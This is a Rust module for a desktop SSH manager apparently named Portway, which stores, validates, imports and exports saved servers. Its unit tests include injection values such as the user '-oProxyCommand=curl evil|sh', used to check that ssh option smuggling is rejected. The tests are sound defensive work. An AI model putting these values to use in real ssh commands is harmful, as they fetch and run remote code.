//! Saved server connections, persisted as JSON in the app data directory.
//! Nothing here touches the servers themselves; it is only the local list.

use serde::{Deserialize, Serialize};
use std::fs;
use std::path::PathBuf;
use std::sync::Mutex;
use std::time::{SystemTime, UNIX_EPOCH};

use crate::error::{AppError, AppResult};
use crate::keys::list_keys;
use crate::paths::{contract_tilde, expand_tilde};
use crate::ssh_config::{self, ConfigHost};

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "camelCase", rename_all_fields = "camelCase")]
pub enum Auth {
    /// Private key file, stored as written by the user (usually `~/.ssh/...`).
    Key { path: String },
    /// Password kept in the OS keychain (asked on first connect).
    Password,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Account {
    pub user: String,
    pub auth: Auth,
}

/// Another saved server (and account) to go through, like OpenSSH ProxyJump.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct JumpRef {
    pub server_id: String,
    pub user: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Server {
    pub id: String,
    pub name: String,
    pub host: String,
    pub port: u16,
    #[serde(default)]
    pub group: String,
    #[serde(default)]
    pub tags: Vec<String>,
    #[serde(default)]
    pub note: String,
    /// The first account is the default one.
    pub accounts: Vec<Account>,
    /// Reach this server through another one (a bastion); None connects directly.
    #[serde(default)]
    pub jump: Option<JumpRef>,
    /// Detected on connect, e.g. "Ubuntu 24.04"; None until then.
    #[serde(default)]
    pub os: Option<String>,
    #[serde(default)]
    pub pinned: bool,
    /// systemd units shown in "Dịch vụ". None until first chosen, so a
    /// starting set can be offered once; an empty list is a choice too.
    #[serde(default)]
    pub watched_units: Option<Vec<String>>,
    /// Names the user gave units, e.g. "worker-queue.service" → "Hàng đợi".
    #[serde(default)]
    pub unit_names: std::collections::HashMap<String, String>,
    pub created_at: u64,
    pub updated_at: u64,
}

/// What the add/edit form sends. `id` is None when adding.
#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ServerInput {
    pub id: Option<String>,
    pub name: String,
    pub host: String,
    pub port: u16,
    #[serde(default)]
    pub group: String,
    #[serde(default)]
    pub tags: Vec<String>,
    #[serde(default)]
    pub note: String,
    pub accounts: Vec<Account>,
    #[serde(default)]
    pub jump: Option<JumpRef>,
    #[serde(default)]
    pub pinned: Option<bool>,
}

#[derive(Serialize, Deserialize, Default)]
struct StoreFile {
    version: u32,
    servers: Vec<Server>,
}

pub struct ServerStore {
    path: PathBuf,
    servers: Mutex<Vec<Server>>,
}

fn now_ms() -> u64 {
    SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_millis() as u64).unwrap_or(0)
}

impl ServerStore {
    pub fn load(path: PathBuf) -> AppResult<Self> {
        let servers = match fs::read_to_string(&path) {
            Ok(text) => serde_json::from_str::<StoreFile>(&text)?.servers,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Vec::new(),
            Err(e) => return Err(e.into()),
        };
        Ok(Self { path, servers: Mutex::new(servers) })
    }

    /// Write to a temp file and rename, so a crash never leaves a half-written list.
    fn persist(&self, servers: &[Server]) -> AppResult<()> {
        if let Some(dir) = self.path.parent() {
            fs::create_dir_all(dir)?;
        }
        let tmp = self.path.with_extension("json.tmp");
        let file = StoreFile { version: 1, servers: servers.to_vec() };
        fs::write(&tmp, serde_json::to_vec_pretty(&file)?)?;
        fs::rename(&tmp, &self.path)?;
        Ok(())
    }

    pub fn list(&self) -> Vec<Server> {
        self.servers.lock().unwrap().clone()
    }

    pub fn save(&self, input: ServerInput) -> AppResult<Server> {
        let mut servers = self.servers.lock().unwrap();
        let input = normalize(input);
        validate(&input, &servers)?;
        let now = now_ms();
        let saved = match &input.id {
            Some(id) => {
                let existing = servers.iter_mut().find(|s| &s.id == id).ok_or_else(|| AppError::new("not_found"))?;
                existing.name = input.name;
                existing.host = input.host;
                existing.port = input.port;
                existing.group = input.group;
                existing.tags = input.tags;
                existing.note = input.note;
                existing.accounts = input.accounts;
                existing.jump = input.jump;
                if let Some(p) = input.pinned {
                    existing.pinned = p;
                }
                existing.updated_at = now;
                existing.clone()
            }
            None => {
                let server = Server {
                    watched_units: None,
                    unit_names: Default::default(),
                    id: uuid::Uuid::new_v4().to_string(),
                    name: input.name,
                    host: input.host,
                    port: input.port,
                    group: input.group,
                    tags: input.tags,
                    note: input.note,
                    accounts: input.accounts,
                    jump: input.jump,
                    os: None,
                    pinned: input.pinned.unwrap_or(false),
                    created_at: now,
                    updated_at: now,
                };
                servers.push(server.clone());
                server
            }
        };
        self.persist(&servers)?;
        Ok(saved)
    }

    /// Record the OS detected on connect; only writes when it changed.
    pub fn set_os(&self, id: &str, os: &str) -> AppResult<()> {
        let mut servers = self.servers.lock().unwrap();
        let Some(server) = servers.iter_mut().find(|s| s.id == id) else { return Ok(()) };
        if server.os.as_deref() == Some(os) {
            return Ok(());
        }
        server.os = Some(os.to_string());
        self.persist(&servers)
    }

    /// Pin or unpin a server.
    pub fn set_pinned(&self, id: &str, pinned: bool) -> AppResult<Server> {
        let mut servers = self.servers.lock().unwrap();
        let server = servers.iter_mut().find(|s| s.id == id).ok_or_else(|| AppError::new("not_found"))?;
        server.pinned = pinned;
        let saved = server.clone();
        self.persist(&servers)?;
        Ok(saved)
    }

    pub fn set_watched_units(&self, id: &str, units: Vec<String>) -> AppResult<Server> {
        let mut servers = self.servers.lock().unwrap();
        let server = servers.iter_mut().find(|s| s.id == id).ok_or_else(|| AppError::new("not_found"))?;
        server.watched_units = Some(units);
        let saved = server.clone();
        self.persist(&servers)?;
        Ok(saved)
    }

    /// Give a unit a display name; an empty name removes it.
    pub fn set_unit_name(&self, id: &str, unit: &str, name: &str) -> AppResult<Server> {
        let mut servers = self.servers.lock().unwrap();
        let server = servers.iter_mut().find(|s| s.id == id).ok_or_else(|| AppError::new("not_found"))?;
        let name = name.trim();
        if name.is_empty() {
            server.unit_names.remove(unit);
        } else {
            server.unit_names.insert(unit.to_string(), name.to_string());
        }
        let saved = server.clone();
        self.persist(&servers)?;
        Ok(saved)
    }

    pub fn delete(&self, id: &str) -> AppResult<()> {
        let mut servers = self.servers.lock().unwrap();
        let before = servers.len();
        servers.retain(|s| s.id != id);
        if servers.len() == before {
            return Err(AppError::new("not_found"));
        }
        self.persist(&servers)
    }

    /// Write the list to a JSON file the user picked. Passwords and key
    /// passphrases stay in the Keychain; only key file paths are included.
    pub fn export(&self, path: &std::path::Path) -> AppResult<usize> {
        let servers = self.list();
        let file = StoreFile { version: 1, servers: servers.clone() };
        fs::write(path, serde_json::to_vec_pretty(&file)?)?;
        Ok(servers.len())
    }

    /// Add servers from an exported file, skipping names already in the list.
    pub fn import_file(&self, path: &std::path::Path) -> AppResult<ImportReport> {
        let text = fs::read_to_string(path)?;
        let file: StoreFile = serde_json::from_str(&text).map_err(|e| AppError::detail("invalid_file", e))?;
        let mut servers = self.servers.lock().unwrap();
        let found = file.servers.len();
        let (mut added, mut skipped) = (Vec::new(), Vec::new());
        let now = now_ms();
        // Jumps point at ids from the other machine; follow them to the new ids.
        let mut ids = std::collections::HashMap::new();
        for mut s in file.servers {
            // The same checks as the editor (a file from elsewhere is not trusted):
            // a user or host starting with '-' would reach ssh as an option.
            let input = normalize(ServerInput {
                id: None,
                name: s.name.clone(),
                host: s.host.clone(),
                port: s.port,
                group: s.group.clone(),
                tags: s.tags.clone(),
                note: s.note.clone(),
                accounts: s.accounts.clone(),
                jump: None,
                pinned: Some(s.pinned),
            });
            let checked = validate(&input, &servers).and_then(|_| {
                if added.iter().any(|x: &Server| x.name.eq_ignore_ascii_case(&input.name)) {
                    Err(AppError::field("name_taken", "name"))
                } else {
                    Ok(())
                }
            });
            if checked.is_err() {
                skipped.push(s.name);
                continue;
            }
            (s.name, s.host, s.group, s.tags, s.note, s.accounts) = (input.name, input.host, input.group, input.tags, input.note, input.accounts);
            let new_id = uuid::Uuid::new_v4().to_string();
            ids.insert(std::mem::replace(&mut s.id, new_id), s.id.clone());
            s.created_at = now;
            s.updated_at = now;
            added.push(s);
        }
        for s in &mut added {
            s.jump = s.jump.take().and_then(|j| ids.get(&j.server_id).map(|id| JumpRef { server_id: id.clone(), user: j.user }));
        }
        servers.extend(added.iter().cloned());
        if !added.is_empty() {
            self.persist(&servers)?;
        }
        Ok(ImportReport { found, added, skipped })
    }

    /// Add hosts that are not in the list yet. A host counts as present when a
    /// server has the same name, or the same host, port and a matching user.
    pub fn import(&self, hosts: Vec<ConfigHost>) -> AppResult<ImportReport> {
        let mut servers = self.servers.lock().unwrap();
        let found = hosts.len();
        let default_key = default_key_path();
        let fallback_user = std::env::var("USER").unwrap_or_else(|_| "root".into());
        let (mut added, mut skipped) = (Vec::new(), Vec::new());
        let now = now_ms();
        let mut jumps = Vec::new();

        for h in hosts {
            let user = h.user.clone().unwrap_or_else(|| fallback_user.clone());
            if !valid_host(&h.host_name) || !valid_user(&user) {
                skipped.push(h.alias);
                continue;
            }
            let present = servers.iter().any(|s| {
                s.name.eq_ignore_ascii_case(&h.alias)
                    || (s.host.eq_ignore_ascii_case(&h.host_name) && s.port == h.port && s.accounts.iter().any(|a| a.user == user))
            });
            if present {
                skipped.push(h.alias);
                continue;
            }
            let auth = match h.identity_file.as_deref().or(default_key.as_deref()) {
                Some(path) => Auth::Key { path: contract_tilde(&expand_tilde(path)) },
                None => Auth::Password,
            };
            let server = Server {
                watched_units: None,
                unit_names: Default::default(),
                id: uuid::Uuid::new_v4().to_string(),
                name: h.alias,
                host: h.host_name,
                port: h.port,
                group: String::new(),
                tags: Vec::new(),
                note: String::new(),
                accounts: vec![Account { user, auth }],
                jump: None,
                os: None,
                pinned: false,
                created_at: now,
                updated_at: now,
            };
            if let Some(j) = h.proxy_jump {
                jumps.push((server.id.clone(), j));
            }
            servers.push(server.clone());
            added.push(server);
        }
        // ProxyJump names another Host: link it once every host is in.
        for (id, spec) in jumps {
            let (user, rest) = spec.split_once('@').map(|(u, r)| (Some(u.to_string()), r)).unwrap_or((None, spec.as_str()));
            let (host, port) = match rest.rsplit_once(':') {
                Some((h, p)) if p.parse::<u16>().is_ok() => (h, p.parse::<u16>().ok()),
                _ => (rest, None),
            };
            let via = servers.iter().find(|s| {
                s.id != id && (s.name.eq_ignore_ascii_case(host) || (s.host.eq_ignore_ascii_case(host) && port.is_none_or(|p| p == s.port)))
            });
            let Some(via) = via else { continue };
            let Some(account) = via.accounts.iter().find(|a| user.as_deref().is_none_or(|u| a.user == u)) else { continue };
            let jump = JumpRef { server_id: via.id.clone(), user: account.user.clone() };
            for s in servers.iter_mut().chain(added.iter_mut()).filter(|s| s.id == id) {
                s.jump = Some(jump.clone());
            }
        }
        if !added.is_empty() {
            self.persist(&servers)?;
        }
        Ok(ImportReport { found, added, skipped })
    }
}

/// Without an IdentityFile, ssh tries the default keys; pick the first that exists.
fn default_key_path() -> Option<String> {
    let keys = list_keys();
    ["id_ed25519", "id_ecdsa", "id_rsa"]
        .iter()
        .find_map(|name| keys.iter().find(|k| k.name == *name))
        .or(keys.first())
        .map(|k| k.path.clone())
}

fn normalize(mut input: ServerInput) -> ServerInput {
    input.name = input.name.trim().to_string();
    input.host = input.host.trim().to_string();
    input.group = input.group.trim().to_string();
    input.note = input.note.trim().to_string();
    let mut tags: Vec<String> = Vec::new();
    for t in input.tags.iter().map(|t| t.trim()).filter(|t| !t.is_empty()) {
        if !tags.iter().any(|x| x.eq_ignore_ascii_case(t)) {
            tags.push(t.to_string());
        }
    }
    input.tags = tags;
    for a in &mut input.accounts {
        a.user = a.user.trim().to_string();
    }
    input.accounts.retain(|a| !a.user.is_empty());
    input
}

/// A host name or address ssh can only read as a destination: no leading '-'
/// (it would be taken as an option) and nothing a shell or ssh treats specially.
pub(crate) fn valid_host(h: &str) -> bool {
    !h.is_empty() && !h.starts_with('-') && h.len() <= 255 && h.chars().all(|c| c.is_ascii_alphanumeric() || ".-_:[]%".contains(c))
}

/// A login name: letters, digits and `._-@`, never starting with '-'.
pub(crate) fn valid_user(u: &str) -> bool {
    !u.is_empty() && !u.starts_with('-') && u.len() <= 64 && u.chars().all(|c| c.is_ascii_alphanumeric() || "._-@".contains(c))
}

fn validate(input: &ServerInput, servers: &[Server]) -> AppResult<()> {
    if input.name.is_empty() {
        return Err(AppError::field("required", "name"));
    }
    let taken = servers.iter().any(|s| Some(&s.id) != input.id.as_ref() && s.name.eq_ignore_ascii_case(&input.name));
    if taken {
        return Err(AppError::field("name_taken", "name"));
    }
    if input.host.is_empty() {
        return Err(AppError::field("required", "host"));
    }
    if !valid_host(&input.host) {
        return Err(AppError::field("invalid_host", "host"));
    }
    if input.port == 0 {
        return Err(AppError::field("invalid_port", "port"));
    }
    if input.accounts.is_empty() {
        return Err(AppError::field("no_account", "accounts"));
    }
    if let Some(j) = &input.jump {
        let via = servers.iter().find(|s| s.id == j.server_id).ok_or_else(|| AppError::field("jump_missing", "jump"))?;
        if !via.accounts.iter().any(|a| a.user == j.user) {
            return Err(AppError::field("jump_missing", "jump"));
        }
        // A chain that comes back to this server would never connect.
        let mut seen = vec![j.server_id.clone()];
        let mut next = via.jump.clone();
        while let Some(n) = next {
            if seen.contains(&n.server_id) {
                break;
            }
            seen.push(n.server_id.clone());
            next = servers.iter().find(|s| s.id == n.server_id).and_then(|s| s.jump.clone());
        }
        if input.id.as_ref().is_some_and(|id| seen.contains(id)) {
            return Err(AppError::field("jump_loop", "jump"));
        }
    }
    for (i, a) in input.accounts.iter().enumerate() {
        if !valid_user(&a.user) {
            return Err(AppError { code: "invalid_user", field: Some("accounts"), detail: Some(a.user.clone()) });
        }
        if input.accounts[..i].iter().any(|b| b.user == a.user) {
            return Err(AppError { code: "duplicate_user", field: Some("accounts"), detail: Some(a.user.clone()) });
        }
        if let Auth::Key { path } = &a.auth {
            if path.trim().is_empty() || path.contains(['\n', '\r', '\0']) {
                return Err(AppError::field("no_key", "accounts"));
            }
        }
    }
    Ok(())
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ImportReport {
    /// Hosts found in the config (wildcards excluded).
    pub found: usize,
    pub added: Vec<Server>,
    /// Aliases already in Portway.
    pub skipped: Vec<String>,
}

#[tauri::command]
pub fn servers_export(store: tauri::State<ServerStore>, path: String) -> AppResult<usize> {
    store.export(std::path::Path::new(&path))
}

#[tauri::command]
pub fn servers_import_file(store: tauri::State<ServerStore>, path: String) -> AppResult<ImportReport> {
    store.import_file(std::path::Path::new(&path))
}

#[tauri::command]
pub fn servers_list(store: tauri::State<ServerStore>) -> Vec<Server> {
    store.list()
}

#[tauri::command]
pub fn server_save(store: tauri::State<ServerStore>, input: ServerInput) -> AppResult<Server> {
    store.save(input)
}

#[tauri::command]
pub fn server_set_pinned(store: tauri::State<ServerStore>, id: String, pinned: bool) -> AppResult<Server> {
    store.set_pinned(&id, pinned)
}

#[tauri::command]
pub fn server_set_watched_units(store: tauri::State<ServerStore>, id: String, units: Vec<String>) -> AppResult<Server> {
    store.set_watched_units(&id, units)
}

#[tauri::command]
pub fn server_set_unit_name(store: tauri::State<ServerStore>, id: String, unit: String, name: String) -> AppResult<Server> {
    store.set_unit_name(&id, &unit, &name)
}

#[tauri::command]
pub fn server_delete(store: tauri::State<ServerStore>, id: String) -> AppResult<()> {
    store.delete(&id)
}

#[tauri::command]
pub fn servers_import_ssh_config(store: tauri::State<ServerStore>) -> AppResult<ImportReport> {
    let hosts = ssh_config::read_default().map_err(|e| {
        if e.kind() == std::io::ErrorKind::NotFound { AppError::new("no_ssh_config") } else { e.into() }
    })?;
    store.import(hosts)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn temp_store(name: &str) -> ServerStore {
        let path = std::env::temp_dir().join(format!("portway-test-{}-{}.json", name, std::process::id()));
        let _ = fs::remove_file(&path);
        ServerStore::load(path).unwrap()
    }

    fn input(name: &str, host: &str) -> ServerInput {
        ServerInput {
            id: None,
            name: name.into(),
            host: host.into(),
            port: 22,
            group: String::new(),
            tags: vec![" docker ".into(), "Docker".into(), "".into()],
            note: String::new(),
            accounts: vec![Account { user: " root ".into(), auth: Auth::Key { path: "~/.ssh/id_ed25519".into() } }],
            jump: None,
            pinned: None,
        }
    }

    #[test]
    fn save_normalizes_and_persists() {
        let store = temp_store("save");
        let s = store.save(input(" web-01 ", "10.0.0.1")).unwrap();
        assert_eq!(s.name, "web-01");
        assert_eq!(s.tags, ["docker"]);
        assert_eq!(s.accounts[0].user, "root");

        let reloaded = ServerStore::load(store.path.clone()).unwrap();
        assert_eq!(reloaded.list().len(), 1);
        fs::remove_file(&store.path).ok();
    }

    #[test]
    fn rejects_duplicate_names_and_bad_input() {
        let store = temp_store("validate");
        store.save(input("web-01", "10.0.0.1")).unwrap();
        assert_eq!(store.save(input("WEB-01", "10.0.0.2")).unwrap_err().code, "name_taken");
        assert_eq!(store.save(input("", "10.0.0.2")).unwrap_err().code, "required");
        assert_eq!(store.save(input("x", "bad host")).unwrap_err().code, "invalid_host");
        let mut no_user = input("y", "10.0.0.3");
        no_user.accounts[0].user = "  ".into();
        assert_eq!(store.save(no_user).unwrap_err().code, "no_account");
        fs::remove_file(&store.path).ok();
    }

    #[test]
    fn import_skips_existing() {
        let store = temp_store("import");
        store.save(input("web-01", "10.0.0.1")).unwrap();
        let host = |alias: &str, name: &str| ConfigHost {
            alias: alias.into(),
            host_name: name.into(),
            port: 22,
            user: Some("root".into()),
            identity_file: Some("~/.ssh/id_ed25519".into()),
            proxy_jump: None,
        };
        let report = store
            .import(vec![host("web-01", "1.1.1.1"), host("web-alias", "10.0.0.1"), host("new", "10.0.0.9")])
            .unwrap();
        assert_eq!(report.found, 3);
        assert_eq!(report.skipped, ["web-01", "web-alias"]);
        assert_eq!(report.added.len(), 1);
        assert_eq!(store.list().len(), 2);
        fs::remove_file(&store.path).ok();
    }

    #[test]
    fn import_links_proxy_jump() {
        let store = temp_store("import-jump");
        let bastion = store.save(input("bastion", "1.1.1.1")).unwrap();
        let app = ConfigHost { alias: "app".into(), host_name: "10.0.0.5".into(), port: 22, user: Some("dev".into()), identity_file: None, proxy_jump: Some("root@bastion".into()) };
        let lost = ConfigHost { proxy_jump: Some("nowhere".into()), alias: "lost".into(), host_name: "10.0.0.6".into(), ..app.clone() };
        let r = store.import(vec![app, lost]).unwrap();
        assert_eq!(r.added[0].jump, Some(JumpRef { server_id: bastion.id.clone(), user: "root".into() }));
        assert_eq!(r.added[1].jump, None);
        assert_eq!(store.list()[1].jump, r.added[0].jump);
        fs::remove_file(&store.path).ok();
    }

    #[test]
    fn export_then_import_skips_same_names() {
        let a = temp_store("export-a");
        a.save(input("web-01", "10.0.0.1")).unwrap();
        a.save(input("db-01", "10.0.0.2")).unwrap();
        let file = a.path.with_extension("export.json");
        assert_eq!(a.export(&file).unwrap(), 2);
        let b = temp_store("export-b");
        b.save(input("WEB-01", "10.9.9.9")).unwrap();
        let report = b.import_file(&file).unwrap();
        assert_eq!((report.found, report.skipped.clone(), report.added.len()), (2, vec!["web-01".to_string()], 1));
        assert_ne!(report.added[0].id, a.list()[1].id);
        assert_eq!(b.list().len(), 2);
        assert_eq!(b.import_file(&a.path.with_extension("missing")).err().map(|e| e.code), Some("io"));
        for p in [&a.path, &b.path, &file] {
            fs::remove_file(p).ok();
        }
    }

    #[test]
    fn jump_must_exist_and_not_loop() {
        let store = temp_store("jump");
        let a = store.save(input("bastion", "1.1.1.1")).unwrap();
        let mut b = input("app", "10.0.0.5");
        b.jump = Some(JumpRef { server_id: a.id.clone(), user: "nobody".into() });
        assert_eq!(store.save(b.clone()).unwrap_err().code, "jump_missing");
        b.jump = Some(JumpRef { server_id: a.id.clone(), user: "root".into() });
        let b = store.save(b).unwrap();
        // bastion through app would come back to bastion.
        let mut back = input("bastion", "1.1.1.1");
        back.id = Some(a.id.clone());
        back.jump = Some(JumpRef { server_id: b.id.clone(), user: "root".into() });
        assert_eq!(store.save(back).unwrap_err().code, "jump_loop");
        // Export and import keep the link, pointing at the new ids.
        let file = store.path.with_extension("jump.json");
        store.export(&file).unwrap();
        let other = temp_store("jump-b");
        let r = other.import_file(&file).unwrap();
        let (na, nb) = (&r.added[0], &r.added[1]);
        assert_eq!(nb.jump.as_ref().map(|j| j.server_id.clone()), Some(na.id.clone()));
        for p in [&store.path, &other.path, &file] {
            fs::remove_file(p).ok();
        }
    }

    #[test]
    fn refuses_hosts_and_users_ssh_would_read_as_options() {
        let store = temp_store("hostile");
        let mut bad = input("evil", "-oProxyCommand=sh");
        assert_eq!(store.save(bad.clone()).unwrap_err().code, "invalid_host");
        bad.host = "10.0.0.1".into();
        bad.accounts[0].user = "-oProxyCommand=curl evil|sh".into();
        assert_eq!(store.save(bad).unwrap_err().code, "invalid_user");
        assert!(valid_host("fe80::1%en0") && valid_host("[::1]") && valid_host("web-01.example.com"));
        assert!(!valid_host("a b") && !valid_host("a;b") && !valid_host(""));
        assert!(valid_user("deploy") && valid_user("svc.web-1") && !valid_user("a b") && !valid_user("-l"));

        // An exported file with such entries imports nothing dangerous.
        let file = store.path.with_extension("hostile.json");
        let now = 0;
        let server = |name: &str, host: &str, user: &str| Server {
            id: name.into(), name: name.into(), host: host.into(), port: 22, group: String::new(), tags: vec![], note: String::new(),
            accounts: vec![Account { user: user.into(), auth: Auth::Password }], jump: None, os: None, pinned: false,
            watched_units: None, unit_names: Default::default(), created_at: now, updated_at: now,
        };
        let data = StoreFile { version: 1, servers: vec![server("a", "10.0.0.1", "-oProxyCommand=x"), server("b", "-oX", "root"), server("c", "10.0.0.2", "root")] };
        fs::write(&file, serde_json::to_vec(&data).unwrap()).unwrap();
        let r = store.import_file(&file).unwrap();
        assert_eq!((r.added.len(), r.skipped.clone()), (1, vec!["a".to_string(), "b".to_string()]));
        for p in [&store.path, &file] {
            fs::remove_file(p).ok();
        }
    }
}
